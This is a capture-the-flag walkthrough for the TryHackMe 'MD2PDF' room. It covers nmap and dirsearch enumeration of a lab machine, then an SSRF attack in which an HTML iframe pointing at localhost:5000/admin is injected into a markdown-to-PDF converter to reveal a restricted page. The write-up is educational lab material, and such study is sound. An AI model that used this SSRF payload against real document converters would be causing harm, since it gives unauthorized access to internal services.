#  MD2PDF Walkthrough
<br/>

## Intro
Welcome into the surfer room, here is the link of the [challenge](https://tryhackme.com/r/room/md2pdf) on TryHackMe.
In this CTF we are gonna explore one of the many possible roads to exploit a vulnerable web-application.

*"Hello Hacker!*
*TopTierConversions LTD is proud to announce its latest and greatest product launch: MD2PDF.*
*This easy-to-use utility converts markdown files to PDF and is totally secure! Right...?"*

Whenever you feel ready press "start machine" and connect via OpenVPN or use the AttackBox.

<br/>
<br/>

## The Challenge
Let's add the IP to the hosts file for commodity:
```bash
echo "MACHINE-IP md2pdf.thm" | sudo tee -a /etc/hosts
```
(sobsitute with the actual machine IP address)

Let's do now a port scan of the target ti have more information:
```bash
nmap -sV md2pdf.thm
```

We can find 3 open ports: 
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  rtsp
5000/tcp open  rtsp
```

Still enumerating we can do a directory scan of the website to see if there are any hidden pages:
```
dirsearch -u http://md2pdf.thm
```

Directory scan found /admin, let's visit it, we get this:
```
# Forbidden
This page can only be seen internally (localhost:5000)
```

So now we can go on the main webpage where the app is hosted:
```
http://md2pdf.thm
```

we can guess that the flag is in the page that is forbidden for us, and since it can only be accessed by an insternal server we can try to exploit the app that convert Markdown syntax to PDF.

One thing to know about MD is that it also supports some of HTML and CSS tags, since our goal is to do an SSRF (Server Side Request Forgery)
, where we appear to be the internal machine contacting another internal resource to bypass he filter we found previously.

We can achieve it with an iframe which will show the content of another web page in a "window-box", and since this request will be elaborated by the app it will result in an SSRF.

So we can insert this snippet and press the button:
```html
<iframe src=http://localhost:5000/admin height=900px width=450px>lol</iframe>
```

The generate PDF file will contain the flag.

<br/>
<br/>

Congratulations you have succesfully exploited the SSRF vulnerability in this web-app to find the flag! Hope you had fun doing it and following along.

Catch you in the next CTF 😃 
